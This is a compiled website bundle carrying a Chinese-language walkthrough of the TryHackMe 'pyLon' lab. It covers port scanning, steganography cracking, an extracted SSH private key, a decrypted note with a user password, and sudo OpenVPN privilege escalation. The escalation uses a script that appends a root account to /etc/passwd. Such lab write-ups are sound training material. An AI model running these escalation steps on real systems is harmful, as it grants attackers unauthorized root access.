"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[78],{22420:(n,e,o)=>{o.r(e),o.d(e,{assets:()=>p,contentTitle:()=>r,default:()=>c,frontMatter:()=>a,metadata:()=>l,toc:()=>t});var i=o(74848),s=o(28453);const a={sidebar_position:159,tags:["Easy","Linux","\u6587\u4ef6\u9690\u5199","\u5bc6\u7801\u5b66","SUDO"],title:"pyLon",description:"pyLon",sidebar_label:"pyLon",slug:"/tryhackme/159"},r="pyLon",l={id:"box/TryHackMe/159",title:"pyLon",description:"pyLon",source:"@site/docs/box/TryHackMe/159.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/159",permalink:"/docs/tryhackme/159",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u6587\u4ef6\u9690\u5199",permalink:"/docs/tags/\u6587\u4ef6\u9690\u5199"},{label:"\u5bc6\u7801\u5b66",permalink:"/docs/tags/\u5bc6\u7801\u5b66"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:159,frontMatter:{sidebar_position:159,tags:["Easy","Linux","\u6587\u4ef6\u9690\u5199","\u5bc6\u7801\u5b66","SUDO"],title:"pyLon",description:"pyLon",sidebar_label:"pyLon",slug:"/tryhackme/159"},sidebar:"boxSidebar",previous:{title:"StuxCTF",permalink:"/docs/tryhackme/158"},next:{title:"Red Stone One Carat",permalink:"/docs/tryhackme/160"}},p={},t=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"\u6587\u4ef6\u9690\u5199",id:"\u6587\u4ef6\u9690\u5199",level:2},{value:"222",id:"222",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"lone",id:"lone",level:3},{value:"lone \u2014&gt; pood",id:"lone--pood",level:3},{value:"pood \u2014&gt; root",id:"pood--root",level:3}];function d(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h1,{id:"pylon",children:"pyLon"}),"\n",(0,i.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-174-17:~/pylonzf# nmap -sTCV -p 22,222 --min-rate 10000 10.10.45.44\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-09 07:25 BST\nNmap scan report for ip-10-10-45-44.eu-west-1.compute.internal (10.10.45.44)\nHost is up (0.00012s latency).\n\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 12:9f:ae:2d:f8:af:04:bc:8d:6e:2d:55:66:a8:b7:55 (RSA)\n|   256 ce:65:eb:ce:9f:3f:57:16:6a:79:45:9d:d3:d2:eb:f2 (ECDSA)\n|_  256 6c:3b:a7:02:3f:a9:cd:83:f2:b9:46:6c:d0:d6:e6:ec (EdDSA)\n222/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)\nMAC Address: 02:4E:7C:1C:22:83 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.90 seconds\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\u6587\u4ef6\u9690\u5199",children:"\u6587\u4ef6\u9690\u5199"}),"\n",(0,i.jsx)(e.p,{children:"\u5c06\u6211\u4eec\u7684\u7167\u7247\u4e0b\u8f7d\u4e0b\u6765\u4e4b\u540e, \u6211\u5148\u8fdb\u884c\u4e86\u4e00\u6ce2\u5c0f\u64cd\u4f5c\u67e5\u770b\u4e00\u4e9b\u5c5e\u6027, \u7ed3\u679c\u53d1\u73b0\u5728\u5143\u6570\u636e\u4e2d\u5b58\u5728\u4e00\u4e9b\u7279\u6b8a\u7684\u5185\u5bb9 , \u6cc4\u9732\u4e00\u4e2a\u52a0\u5bc6\u7684\u65b9\u5f0f"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193240.png",alt:"image-20240709193238720"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e4b\u540e\u4f7f\u7528 stegcracker \u8fdb\u884c\u66b4\u529b\u7834\u89e3, \u6210\u529f\u83b7\u53d6\u5230\u5bc6\u7801"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193247.png",alt:"image-20240709193246061"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e4b\u540e\u67e5\u770b\u6211\u4eec\u751f\u6210\u7684\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-174-17:~/pylonzf# cat pepper.jpg.out \n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\n7Xa73W632+12/5XfActiLj0AKAAA\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f53\u6211\u770b\u5230\u8fd9\u4e2a\u6587\u4ef6\u7684\u65f6\u5019,\u6211\u77e5\u9053\u8be5\u89e3\u5bc6\u4e86, \u539f\u672c\u6211\u60f3\u7684\u662f\u6309\u7167\u4e0a\u9762\u7684\u4e00\u6761\u52a0\u5bc6\u8def\u5f84\u8fdb\u884c\u89e3\u5bc6, \u4f46\u662f\u5f88\u9057\u61be\u8fd9\u5e76\u4e0d\u9002\u7528\u4e8e\u8fd9\u91cc, \u5f53\u5c1d\u8bd5\u8fdb\u884c Base 64 \u7f16\u7801\u4e4b\u540e\u6211\u53d1\u73b0\u5176\u9488\u5bf9\u7684\u662f\u4e00\u4e2a gzip \u538b\u7f29\u6587\u4ef6"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193255.png",alt:"image-20240709193254084"})}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u89e3\u538b\u5e76\u67e5\u770b, \u4ece\u4e0b\u9762\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u4e00\u4e9b\u4e8b\u60c5:"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"\u5b58\u5728\u4e00\u4e2a OPENSSH \u7684\u79c1\u94a5, \u4f46\u662f\u7edd\u4e0d\u662f SSH \u7684\u79c1\u94a5, \u7ed3\u5408\u7aef\u53e3\u60c5\u51b5\u6765\u770b, \u5224\u65ad\u4e3a \u8fde\u63a5 222 \u7aef\u53e3\u7684\u5185\u5bb9"}),"\n",(0,i.jsx)(e.li,{children:"\u4e00\u4e9b\u6742\u4e71\u7684\u5185\u5bb9"}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-160-88:~/redstoneonecarat# gunzip download.gz \nroot@ip-10-10-160-88:~/redstoneonecarat# strings download \nlone_id\n0000777\n0001750\n0001750\n00000003437\n14004470261\n011570\nustar  \npood0g\npood0g\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA45nVhEtT37sKnNBWH2VYsXbjA8vAK8e04HfrgF06NiGGQsRBLtJw\nYJu73+zGO0AoETo8LYhxB5eI5D9KzboGuTDAuGZQuUq+8N/hBmfavieHLHgkRNBr0ErJ60\nl2FAcDW6pDowfiwC1vsdixQ6L8kvVhdkz0GUfPAlfIRhHHtQaQnQ7wnRtdGjIPK9/S1MPs\nIJOLD2S79NxS7vguw87Mp0cnRjDalaCcRE0ELUvLDKQdZlWba0kF/PciqknkDYq2mbkCRd\n3jWX2Umx0WtP2wCh9BQ/syxTJDXn6mCEsoNI/roLKyB1uGms/pFiBxS0qdiZAAO6CyTkyG\nhZwb1BKmUwAAA8hSynq9Usp6vQAAAAdzc2gtcnNhAAABAQDjmdWES1Pfuwqc0FYfZVixdu\nMDy8Arx7Tgd+uAXTo2IYZCxEEu0nBgm7vf7MY7QCgROjwtiHEHl4jkP0rNuga5MMC4ZlC5\nSr7w3+EGZ9q+J4cseCRE0GvQSsnrSXYUBwNbqkOjB+LALW+x2LFDovyS9WF2TPQZR88CV8\nhGEce1BpCdDvCdG10aMg8r39LUw+wgk4sPZLv03FLu+C7DzsynRydGMNqVoJxETQQtS8sM\npB1mVZtrSQX89yKqSeQNiraZuQJF3eNZfZSbHRa0/bAKH0FD+zLFMkNefqYISyg0j+ugsr\nIHW4aaz+kWIHFLSp2JkAA7oLJOTIaFnBvUEqZTAAAAAwEAAQAAAQB+u03U2EzfqzqBjtAl\nszzrtBM8LdvXhOAGjT+ovkCHm6syyiyxcaP5Zz35tdG7dEHbNd4ETJEDdTFYRpXUb90GiU\nsGYpJYWnJvlXmrI3D9qOzvqgYn+xXNaZd9V+5TwIPyKqB2yxFLiQFEujAaRUr2WYPnZ3oU\nCZQO7eoqegQFm5FXLy0zl0elAkEiDrrpS5CNBunv297nHMLFBPIEB231MNbYMDe0SU40NQ\nWAGELdiAQ9i7N/SMjAJYAV2MAjbbzp5uKDUNxb3An85rUWKHXslATDh25abIY0aGZHLP5x\n4B1usmPPLxGTqX19Cm65tkw8ijM6AM9+y4TNj2i3GlQBAAAAgQDN+26ilDtKImrPBv+Akg\ntjsKLL005RLPtKQAlnqYfRJP1xLKKz7ocYdulaYm0syosY+caIzAVcN6lnFoBrzTZ23uwy\nVB0ZsRL/9crywFn9xAE9Svbn6CxGBYQVO6xVCp+GiIXQZHpY7CMVBdANh/EJmGfCJ/gGby\nmut7uOWmfiJAAAAIEA9ak9av7YunWLnDp6ZyUfaRAocSPxt2Ez8+j6m+gwYst+v8cLJ2SJ\nduq0tgz7za8wNrUN3gXAgDzg4VsBUKLS3i41h1DmgqUE5SWgHrhIJw9AL1fo4YumPUkB/0\nS0QMUn16v4S/fnHgZY5KDKSl4hRre5byrsaVK0oluiKsouR4EAAACBAO0uA2IvlaUcSerC\n0OMkML9kGZA7uA52HKR9ZE/B4HR9QQKN4sZ+gOPfiQcuKYaDrfmRCeLddrtIulqY4amVcR\nnx3u2SBx9KM6uqA2w80UlqJb8BVyM4SscUoHdmbqc9Wx5f+nG5Ab8EPPq0FNPrzrBJP5m0\n43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==\n-----END OPENSSH PRIVATE KEY-----\nroot@ip-10-10-160-88:~/redstoneonecarat#\n"})}),"\n",(0,i.jsx)(e.h2,{id:"222",children:"222"}),"\n",(0,i.jsx)(e.p,{children:"\u73b0\u5728\u5e26\u6765\u53e6\u4e00\u4e2a\u95ee\u9898, \u5c31\u662f\u8fde\u63a5\u7684\u7528\u6237\u540d\u662f\u4ec0\u4e48, \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0a\u9762\u786e\u5b9a\u4ee5\u4e0b\u5185\u5bb9:"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"lone_id"}),"\n",(0,i.jsx)(e.li,{children:"lone"}),"\n",(0,i.jsx)(e.li,{children:"ustar"}),"\n",(0,i.jsx)(e.li,{children:"pood0g"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u4f7f\u7528\u6b64\u7528\u6237\u8fdb\u884c\u8fde\u63a5, \u6700\u7ec8\u53d1\u73b0 lone \u7528\u6237\u53ef\u4ee5\u8fdb\u884c\u8fde\u63a5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-160-88:~/redstoneonecarat# ssh -i lone_id lone@10.10.21.37 -p 222\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u767b\u9646\u4e4b\u540e\u663e\u793a\u5982\u4e0b, \u4ece\u5185\u5bb9\u6211\u4eec\u53ef\u4ee5\u63a8\u65ad\u51fa\u8fd9\u662f\u4e00\u4e2a\u6570\u636e\u5e93"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193307.png",alt:"image-20240709193305910"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5176\u9700\u8981\u6211\u4eec\u8f93\u5165\u5bc6\u7801, \u4f46\u662f\u8fd9\u6211\u4eec\u54ea\u91cc\u77e5\u9053, \u67e5\u770b\u63d0\u793a\u540e\u8bf4\u662f\u72d7\u7684\u540d\u5b57, \u4e5f\u5c31\u662f\u6211\u4eec\u7684\u7167\u7247\u540d\u79f0, (\u5f53\u7136\u4e5f\u53ef\u80fd\u662f\u6587\u4ef6\u9690\u5199\u7684\u5bc6\u7801\u8fd9\u91cc\u90fd\u4e00\u6837\u5c31\u65e0\u6240\u8c13\u4e86) \u8f93\u5165 pepper \u540e\u6211\u53d1\u73b0\u4f9d\u65e7\u662f\u9519\u8bef\u7684, \u8fd9\u65f6\u6211\u60f3\u8d77\u6765\u4e4b\u524d\u4ece\u6587\u4ef6\u83b7\u53d6\u7684\u7f16\u7801\u65b9\u5f0f, \u56e0\u6b64\u6211\u5c06 pepper \u6309\u7167\u4e0a\u9762\u7684\u7f16\u7801\u65b9\u5f0f\u8fdb\u884c\u7f16\u7801\u540e\u53d1\u73b0\u6210\u529f\u4e86 ",(0,i.jsx)(e.a,{href:"https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)&input=cGVwcGVy&ieol=%0D%0A&oeol=%0D%0A",children:"\u7f16\u7801\u94fe\u63a5"})]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193318.png",alt:"image-20240709193316379"})}),"\n",(0,i.jsx)(e.p,{children:"\u767b\u9646\u6210\u529f\u540e\u56db\u5904\u67e5\u627e\u53d1\u73b0\u5728\u6570\u636e\u5e93\u4e2d\u6cc4\u9732\u4e86\u7528\u6237\u7684\u767b\u9646\u8d26\u53f7"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193326.png",alt:"image-20240709193324880"})}),"\n",(0,i.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,i.jsx)(e.h3,{id:"lone",children:"lone"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193339.png",alt:"image-20240709193337904"})}),"\n",(0,i.jsxs)(e.p,{children:["\u8fd9\u65f6\u5019\u6211\u53d1\u73b0\u7528\u6237\u5177\u6709 SUDO \u7279\u6743\u53ef\u4ee5\u6267\u884c\u4e00\u4e2a openvpn \u7684\u547d\u4ee4\u56e0\u6b64\u6211\u67e5\u627e\u4e86\u76f8\u5173\u547d\u4ee4\u53d1\u73b0\u4e00\u4e2a\u63d0\u6743\u65b9\u5f0f ",(0,i.jsx)(e.a,{href:"https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/",children:"Sudo OpenVPN Privilege Escalation | Exploit Notes"})]}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"\u5f88\u53ef\u60dc\u5f88\u53ef\u60dc, \u6211\u4eec\u5e76\u6ca1\u6709\u6743\u9650\u4fee\u6539 client.ovpn \u6587\u4ef6"}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"lone@pylon:~$ sudo -l\n[sudo] password for lone: \nMatching Defaults entries for lone on pylon:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser lone may run the following commands on pylon:\n    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn\nlone@pylon:~$ ls -al /opt/openvpn/client.ovpn\n-rw-rw---- 1 root root 8187 Jan 26  2021 /opt/openvpn/client.ovpn\n"})}),"\n",(0,i.jsx)(e.h3,{id:"lone--pood",children:"lone \u2014> pood"}),"\n",(0,i.jsx)(e.p,{children:"\u5728\u7528\u6237 lone \u5bb6\u76ee\u5f55\u8fdb\u884c\u67e5\u627e\u65f6\u6211\u53d1\u73b0\u5176\u6709\u4e00\u4e9b\u7279\u6b8a\u6027"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"\u5b58\u5728\u4e00\u4e2a note_from_pood.gpg \u6211\u4eec\u53ef\u80fd\u9700\u8981\u8fdb\u884c\u89e3\u5bc6, \u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u67e5\u770b\u53d1\u73b0\u65e0\u6cd5\u4f7f\u7528 john \u8fdb\u884c\u7834\u89e3"}),"\n",(0,i.jsx)(e.li,{children:"pylon: \u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u6211\u4eec\u7684 222 \u7aef\u53e3\u670d\u52a1\u5176\u5b58\u5728 git \u7ed3\u5408\u5176\u529f\u80fd,\u611f\u89c9\u5176\u4f1a\u6cc4\u9732\u5bc6\u7801\u6216\u8005\u5bc6\u94a5, \u7ed3\u5408  note_from_pood.gpg \u5e94\u8be5\u662f\u8fd9\u4e2a\u7684\u5bc6\u94a5\u4e86"}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"lone@pylon:~$ ls -al\ntotal 48\n......\n-rw-rw-r-- 1 pood pood  600 Jan 30  2021 note_from_pood.gpg\ndrwxr-xr-x 3 lone lone 4096 Jan 30  2021 pylon\nlone@pylon:~/pylon$ ls -al\ntotal 40\ndrwxr-xr-x 3 lone lone 4096 Jan 30  2021 .\ndrwxr-x--- 6 lone lone 4096 Jan 30  2021 ..\ndrwxrwxr-x 8 lone lone 4096 Jan 30  2021 .git\n-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt\n-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64\n-rwxrwxr-x 1 lone lone 8413 Jan 30  2021 pyLon.py\n-rw-rw-r-- 1 lone lone 2195 Jan 30  2021 pyLon_crypt.py\n-rw-rw-r-- 1 lone lone 3973 Jan 30  2021 pyLon_db.py\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5728\u67e5\u770b\u5176\u7ec6\u8282\u65f6, \u6211\u53d1\u73b0\u4e00\u4e9b\u7279\u6b8a\u5185\u5bb9\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a pyLon.db \u7684\u6587\u4ef6\u5728 64d8bbf \u9636\u6bb5\u88ab\u5220\u9664\u4e86, \u5e76\u4e14\u4ece\u540d\u79f0\u6765\u770b\u5176\u5c31\u662f\u6211\u4eec\u7684 gpg \u5bc6\u94a5,\u6b64\u65f6\u6211\u4eec\u6709\u4e24\u79cd\u89e3\u51b3\u529e\u6cd5:"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"\u76f4\u63a5\u5728\u9776\u673a\u7aef\u4fee\u6539\u8fd9\u4e2a\u670d\u52a1, \u6700\u5feb\u7684\u65b9\u5f0f (\u6211\u9009\u62e9\u8fd9\u79cd\u65b9\u5f0f)"}),"\n",(0,i.jsx)(e.li,{children:"\u5728\u672c\u673a\u8fd0\u884c\u9700\u8981\u4e0b\u8f7d\u5bf9\u5e94\u7684\u4e00\u4e9b\u5e93\u4ec0\u4e48\u7684\u7b14\u8bb0\u6162"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193359.png",alt:"image-20240709193358039"})}),"\n",(0,i.jsx)(e.p,{children:"\u4fee\u6539\u7684\u9776\u673a\u7aef\u5185\u5bb9"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193406.png",alt:"image-20240709193404854"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e4b\u540e\u4ece\u4ee3\u7801\u7684\u4ecb\u7ecd\u4e2d\u6211\u4eec\u77e5\u9053\u4e86\u542f\u52a8\u7684\u65b9\u5f0f\u6240\u4ee5\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"$ python3 pyLon_pwMan.py\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193414.png",alt:"image-20240709193412830"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193421.png",alt:"image-20240709193419386"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e4b\u540e\u4f7f\u7528\u6211\u4eec\u5f97\u5230\u7684 gpg \u5bc6\u94a5\u89e3\u5bc6\u6211\u4eec\u7684\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'lone@pylon:~$ gpg note_from_pood.gpg \ngpg: WARNING: no command supplied.  Trying to guess what you mean ...\ngpg: Note: secret key D83FA5A7160FFE57 expired at Fri Jan 27 19:13:48 2023 UTC\ngpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27\n      "lon E <lone@pylon.thm>"\nlone@pylon:~$ cat note_from_pood\nHi Lone,\n\nCan you please fix the openvpn config?\n\nIt\'s not behaving itself again.\n\noh, by the way, my password is yn0ouE9JLR3h)`=I\n\nThanks again.\nlone@pylon:~$\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u73b0\u5728\u6211\u4eec\u5f97\u5230\u4e86 pood \u7684\u7528\u6237\u5bc6\u7801, \u76f4\u63a5\u4f7f\u7528 SSH \u767b\u9646"}),"\n",(0,i.jsx)(e.h3,{id:"pood--root",children:"pood \u2014> root"}),"\n",(0,i.jsx)(e.p,{children:"\u5728\u679a\u4e3e\u53d1\u73b0 pood \u7528\u6237\u5177\u6709\u7f16\u8f91 client.ovpn \u6743\u9650"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"pood@pylon:~$ sudo -l\n[sudo] password for pood: \nMatching Defaults entries for pood on pylon:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser pood may run the following commands on pylon:\n    (root) sudoedit /opt/openvpn/client.ovpn\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u73b0\u5728\u5c31\u8fde\u63a5\u8d77\u6765\u4e86, \u4f7f\u7528 pood \u7528\u6237\u7f16\u8f91\u6211\u4eec\u7684 ovpn \u6587\u4ef6, \u518d\u4f7f\u7528 noraj \u7528\u6237\u8fdb\u884c\u6267\u884c\u76f4\u63a5\u5b8c\u7f8e\u63d0\u6743 ",(0,i.jsx)(e.a,{href:"https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/",children:"Sudo OpenVPN Privilege Escalation | Exploit Notes"})," \u8fd9\u91cc\u5efa\u8bae\u83b7\u53d6\u4e00\u4e2a root Shell \u800c\u4e0d\u662f /bin/bash, \u6211\u5728\u8fd9\u91cc\u521b\u5efa\u4e86\u65b0\u7684\u7528\u6237"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"pood@pylon:/tmp$ cat << EOF > root.sh \n> #!/bin/bash\n> echo 'FUCK:\\$1\\$admin\\$eiO19kFjs48pgX5PoJpXm1:0:0::/root:/bin/bash' >> /etc/passwd\n> EOF\npood@pylon:/tmp$ chmod 777 root.sh\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e4b\u540e\u53ea\u9700\u8981\u4f7f\u7528 lone \u7528\u6237\u6267\u884c\u4e00\u4e0b\u547d\u4ee4\u5c31\u53ef\u4ee5\u5b8c\u6210\u63d0\u6743\u4e86"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-193436.png",alt:"image-20240709193435367"})})]})}function c(n={}){const{wrapper:e}={...(0,s.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(d,{...n})}):d(n)}},28453:(n,e,o)=>{o.d(e,{R:()=>r,x:()=>l});var i=o(96540);const s={},a=i.createContext(s);function r(n){const e=i.useContext(a);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:r(n.components),i.createElement(a.Provider,{value:e},n.children)}}}]);